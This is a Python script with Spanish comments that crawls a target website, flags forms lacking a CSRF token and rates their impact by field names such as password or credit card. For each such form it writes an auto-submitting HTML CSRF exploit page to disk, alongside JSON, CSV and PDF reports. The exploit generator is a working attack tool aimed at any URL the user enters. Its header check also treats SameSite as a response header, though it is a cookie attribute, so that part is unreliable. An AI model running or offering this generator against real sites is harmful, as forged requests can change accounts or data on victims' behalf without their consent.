import requests
import re
import json
import csv
import pdfkit
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# Configuración
TIMEOUT = 5
HEADERS = {"User-Agent": "Mozilla/5.0"}
CRITICAL_FIELDS = ["password", "token", "credit_card", "ssn"]

# Función para extraer todas las URLs internas de un sitio
def get_internal_links(url, domain):
    try:
        response = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, "html.parser")
        links = [urljoin(url, a["href"]) for a in soup.find_all("a", href=True)]
        return set(link for link in links if domain in link)
    except requests.exceptions.RequestException:
        return set()

# Función para extraer formularios de una página
def get_forms(url):
    try:
        response = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException:
        return []

# Función para analizar la seguridad de un formulario y clasificar su impacto
def analyze_form(form, url):
    action = form.get("action")
    method = form.get("method", "GET").upper()
    inputs = form.find_all("input")

    # Verificar si existe un token CSRF
    csrf_tokens = [i for i in inputs if "csrf" in i.get("name", "").lower()]
    if csrf_tokens:
        return {"url": url, "action": action, "method": method, "csrf_protected": True, "impact": "Ninguno"}

    # Evaluar impacto en función de los campos del formulario
    sensitive_fields = [i for i in inputs if any(field in i.get("name", "").lower() for field in CRITICAL_FIELDS)]
    if sensitive_fields:
        impact = "Crítico" if "password" in [i.get("name", "").lower() for i in sensitive_fields] else "Alto"
    else:
        impact = "Medio" if method == "POST" else "Bajo"

    return {"url": url, "action": action, "method": method, "csrf_protected": False, "impact": impact}

# Función para detectar encabezados de seguridad relacionados con CSRF
def check_security_headers(url):
    try:
        response = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        security_headers = ["X-Frame-Options", "X-CSRF-Token", "Content-Security-Policy", "SameSite"]
        headers_found = {h: response.headers.get(h) for h in security_headers if h in response.headers}
        return headers_found
    except requests.exceptions.RequestException:
        return {}

# Función para generar exploit CSRF en HTML
def generate_csrf_exploit(action, inputs, method):
    form_fields = "\n".join(
        [f'<input type="hidden" name="{i.get("name")}" value="{i.get("value", "")}">' for i in inputs if i.get("name")]
    )
    
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <form action="{action}" method="{method}">
        {form_fields}
        <input type="submit" value="Submit Request">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
"""

# Función para escanear CSRF en un sitio web completo
def csrf_scan(target_url):
    domain = urlparse(target_url).netloc
    print(f"\n[🔍] Escaneando todas las rutas en: {target_url}")
    results = []

    # Obtener todas las URLs internas del sitio
    all_links = get_internal_links(target_url, domain)
    all_links.add(target_url)  # Asegurar que la URL principal sea escaneada

    for link in all_links:
        print(f"[🕵️‍♂️] Explorando: {link}")
        forms = get_forms(link)

        for form in forms:
            form_info = analyze_form(form, link)
            form_info["security_headers"] = check_security_headers(link)
            
            if not form_info["csrf_protected"]:
                print(f"[⚠️] Formulario vulnerable en: {form_info['url']}")
                print(f"[📌] Impacto: {form_info['impact']} | Método: {form_info['method']} | Acción: {form_info['action']}")
                
                # Generar exploit si el formulario es vulnerable
                exploit = generate_csrf_exploit(form_info["action"], form.find_all("input"), form_info["method"])
                with open(f"csrf_exploit_{form_info['impact'].lower()}.html", "w") as exploit_file:
                    exploit_file.write(exploit)
                
                print(f"[✅] Exploit generado: csrf_exploit_{form_info['impact'].lower()}.html")

            results.append(form_info)

    # Guardar reporte
    export_results(results)
    return results

# Función para exportar resultados en JSON, CSV y PDF
def export_results(results):
    with open("csrf_results.json", "w") as json_file:
        json.dump(results, json_file, indent=4)

    with open("csrf_results.csv", "w", newline="") as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(["URL", "Acción", "Método", "CSRF Protegido", "Impacto", "Encabezados de Seguridad"])
        for res in results:
            writer.writerow([res["url"], res["action"], res["method"], res["csrf_protected"], res["impact"], str(res["security_headers"])])

    # Exportar a PDF
    pdf_content = "<h1>Reporte de Vulnerabilidades CSRF</h1><table border='1'><tr><th>URL</th><th>Acción</th><th>Método</th><th>CSRF Protegido</th><th>Impacto</th></tr>"
    for res in results:
        pdf_content += f"<tr><td>{res['url']}</td><td>{res['action']}</td><td>{res['method']}</td><td>{res['csrf_protected']}</td><td>{res['impact']}</td></tr>"
    pdf_content += "</table>"

    pdfkit.from_string(pdf_content, "csrf_results.pdf")
    
    print("[📄] Reportes guardados en csrf_results.json, csrf_results.csv y csrf_results.pdf.")

# Main
if __name__ == "__main__":
    target = input("[🎯] Ingresa la URL objetivo: ")
    csrf_scan(target)
